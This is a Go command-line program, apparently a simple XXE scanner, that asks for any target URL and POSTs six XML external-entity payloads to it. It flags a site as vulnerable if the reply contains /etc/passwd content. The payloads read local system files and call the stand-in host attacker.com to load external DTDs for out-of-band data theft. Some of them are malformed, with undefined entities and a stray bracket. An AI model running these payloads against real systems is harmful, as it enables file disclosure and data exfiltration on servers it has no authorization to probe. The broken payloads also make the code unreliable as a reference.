package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "strings"
)

func main() {
    fmt.Println("\x1b[36mXXE Vulnerability Tester\x1b[0m")
    fmt.Println("-------------------------------")

    // Ask for the target website URL
    fmt.Print("\nEnter your target website URL: ")
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := scanner.Text()

    // Test for XXE vulnerability
    fmt.Println("\n\x1b[36mTesting for XXE vulnerability...\x1b[0m")
    vulnerable, err := testXXE(targetURL)
    if err != nil {
        fmt.Printf("\x1b[31mError testing for XXE vulnerability: %v\x1b[0m\n", err)
        return
    }

    // Print the result
    if vulnerable {
        fmt.Println("\x1b[31mThe target website is vulnerable to XXE.\x1b[0m")
        fmt.Println("\n\x1b[36mHow to Test for XXE Vulnerability:\x1b[0m")
        fmt.Println("-------------------------------")
        fmt.Println("To test for XXE vulnerability, you can send various XML payloads containing external entities and observe the response.")
        fmt.Println("Some example payloads to test for XXE vulnerability:")
        fmt.Println("\x1b[33m1. File Inclusion: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>")
        fmt.Println("2. URL Invocation: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe.txt'>]><foo>&xxe;</foo>")
        fmt.Println("3. Out-of-Band (OOB) Exfiltration: <!DOCTYPE foo [<!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'> %dtd;]><foo>&send;</foo>")
        fmt.Println("4. Blind XXE (Response-Based): <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe.php'>]><foo>&xxe;</foo>")
        fmt.Println("5. Parameter Entity (Internal Subset): <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]><foo>&all;</foo>")
        fmt.Println("6. External Subset: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]><foo>&all;</foo>]")
    } else {
        fmt.Println("\x1b[32mThe target website is not vulnerable to XXE.\x1b[0m")
    }
}

// testXXE checks if a website is vulnerable to XXE
func testXXE(targetURL string) (bool, error) {
    // Construct sample XML payloads with external entities
    payloads := []string{
        `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>`,
        `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe.txt'>]><foo>&xxe;</foo>`,
        `<!DOCTYPE foo [<!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'> %dtd;]><foo>&send;</foo>`,
        `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe.php'>]><foo>&xxe;</foo>`,
        `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]><foo>&all;</foo>`,
        `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]><foo>&all;</foo>]`,
    }

    // Send POST requests with each payload to the target URL
    for _, payload := range payloads {
        // Send a POST request with the payload to the target URL
        fmt.Printf("\x1b[36mSending POST request to %s with XML payload...\x1b[0m\n", targetURL)
        resp, err := http.Post(targetURL, "application/xml", strings.NewReader(payload))
        if err != nil {
            return false, err
        }
        defer resp.Body.Close()

        // Check if the response contains sensitive information (e.g., /etc/passwd)
        fmt.Println("\x1b[36mAnalyzing response...\x1b[0m")
        body := bufio.NewScanner(resp.Body)
        for body.Scan() {
            if strings.Contains(body.Text(), "root:") {
                return true, nil
            }
        }
    }

    return false, nil
}
